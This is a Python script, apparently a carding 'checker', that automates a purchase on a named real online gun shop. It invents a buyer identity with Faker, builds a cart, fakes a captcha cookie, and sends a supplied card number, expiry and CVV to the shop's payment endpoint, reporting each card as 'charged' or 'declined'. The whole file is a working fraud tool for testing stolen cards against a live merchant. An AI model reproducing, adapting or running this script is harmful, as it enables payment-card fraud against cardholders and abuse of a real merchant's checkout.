import asyncio
import httpx
import json
import re
import random
from faker import Faker




#------------------------------------------------------ @theekurd ------------------------------------------->

fake = Faker('en_US')

async def gencaptcha():
    charset = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnpqrstuvwxyz123456789"
    captcha = ''.join(random.choice(charset) for _ in range(6))
    return captcha

async def ready():
    cardinput = input("card|month|year|cvv: ").strip()
    separador = '|' if '|' in cardinput else '/'
    parts = cardinput.split(separador)
    cc = parts[0].strip()
    mm_raw = parts[1].strip()
    yy_raw = parts[2].strip()
    cvv = parts[3].strip()
    mm = mm_raw.zfill(2)
    yy = yy_raw if len(yy_raw) == 4 else f"20{yy_raw}"
    
    firstname = fake.first_name()
    lastname = fake.last_name()
    fullname = f"{firstname} {lastname}"
    phonenumber = f"205{''.join([str(random.randint(0, 9)) for _ in range(7)])}"
    phoneformatted = f"({phonenumber[:3]}) {phonenumber[3:6]}-{phonenumber[6:]}"
    email = f"{firstname.lower()}{random.randint(100, 999)}{lastname.lower()}@gmail.com"
    address = fake.street_address()
    city = fake.city()
    state = fake.state_abbr()
    zipcode = fake.zipcode()
    
    async with httpx.AsyncClient(proxy=None, verify=False, timeout=7.0) as client:
        
        # ===================== request 1 ==================
        header = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'none', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
        req = await client.get(url="https://gunshoplasvegas.com/group/accessories", headers=header)
        
        # ===================== request 2 ==================
        header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/group/accessories', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
        params = {
            'action': 'add_to_cart',
        }
        data = '{"product_id":"1837395","quantity":1,"shopping_cart_id":"","source":"FRONTEND","hostname":"gunshoplasvegas.com","app_route":"/group/accessories"}'
        req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
        cartid = re.search(r'"shopping_cart_id":\s*"(\d+)"', req.text).group(1)
        
        # ===================== request 3 ==================
        header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/delivery', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
        params = {
            'action': 'save_billing',
        }
        data = f'{{"display_name":"","waiver_on_file":false,"first_name":"{firstname}","last_name":"{lastname}","phone_number":"{phonenumber}","email_address":"{email}","notes":"","source":"CHECKOUT","fd_token":null,"shopping_cart_id":"{cartid}","section":"delivery","hostname":"gunshoplasvegas.com","contact_id":6399176}}'
        req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
        response = json.loads(req.text)
        clientid = response.get('client_id')
        
        # ===================== request 4 ==================
        header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/payment', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
        params = {
            'action': 'save_billing',
        }
        data = f'{{"contact_id":6399176,"client_id":{clientid},"first_name":"{firstname}","middle_name":"","last_name":"{lastname}","suffix":"","company_name":"","address_1":"{address}","address_2":"","city":"{city}","state":"{state}","zip_code":"{zipcode}","country_code":"US","latitude":"","longitude":"","email_address":"{email}","phone_number":"{phoneformatted}","phone_number_type_id":1,"birthdate":"","source_id":"","notes":"","last_update":"2025-12-28 10:11:35","inactive":0,"version":1,"membership_id":"","membership_number":"","end_date":"","membership_inactive":"","primary_contact_membership_id":"","subscription_id":"","payment_on_file":0,"drivers_license_number":"","display_name":"{fullname}","waiver_on_file":false,"fd_token":null,"shopping_cart_id":"{cartid}","section":"payment","source":"CHECKOUT","hostname":"gunshoplasvegas.com"}}'
        req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
        
        captcha = await gencaptcha()
        client.cookies.set("checkout_id", captcha, domain="gunshoplasvegas.com", path="/")
        
        # ===================== request 5 ==================
        header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/review', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
        params = {
            'action': 'get_shopping_cart',
        }
        data = f'{{"include_images":true,"using_financing":null,"fd_token":null,"shopping_cart_id":"{cartid}","section":"review","source":"CHECKOUT","hostname":"gunshoplasvegas.com"}}'
        req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
        response = json.loads(req.text)
        amount = response.get('totals', {}).get('balance_remaining', '0.00')
        
        # ===================== request 6 ==================
        header = {'Accept': '*/*', 'Accept-Language': 'es-ES,es;q=0.9', 'Connection': 'keep-alive', 'Content-Type': 'text/plain;charset=UTF-8', 'Origin': 'https://gunshoplasvegas.com', 'Referer': 'https://gunshoplasvegas.com/checkout/review', 'Sec-Fetch-Dest': 'empty', 'Sec-Fetch-Mode': 'cors', 'Sec-Fetch-Site': 'same-origin', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36', 'sec-ch-ua': '"Google Chrome";v="143", "Chromium";v="143", "Not A(Brand";v="24"', 'sec-ch-ua-mobile': '?0', 'sec-ch-ua-platform': '"Windows"'}
        params = {
            'action': 'process_credit_card',
        }
        data = f'{{"number":"{cc}","cardholder_name":"{fullname}","month":"{mm}","year":{yy},"cvv":"{cvv}","simulate":"","checkout_id":"{captcha}","fd_token":null,"shopping_cart_id":"{cartid}","section":"review","source":"CHECKOUT","hostname":"gunshoplasvegas.com"}}'
        req = await client.post(url="https://gunshoplasvegas.com/api/api.php", headers=header, params=params, content=data)
        response = json.loads(req.text)
        
        status = "charged" if response.get('status') in ['success', 'true'] else "declined"
        message = response.get('message', '')
        
        result = {
            "card": cc,
            "month": mm_raw,
            "year": yy_raw,
            "cvv": cvv,
            "status": status,
            "message": message,
            "gateway": "idk",
            "type": "charged",
            "amount": f"${amount}"
        }
        
        print(json.dumps(result, indent=4, ensure_ascii=False))

if __name__ == "__main__":
    asyncio.run(ready())
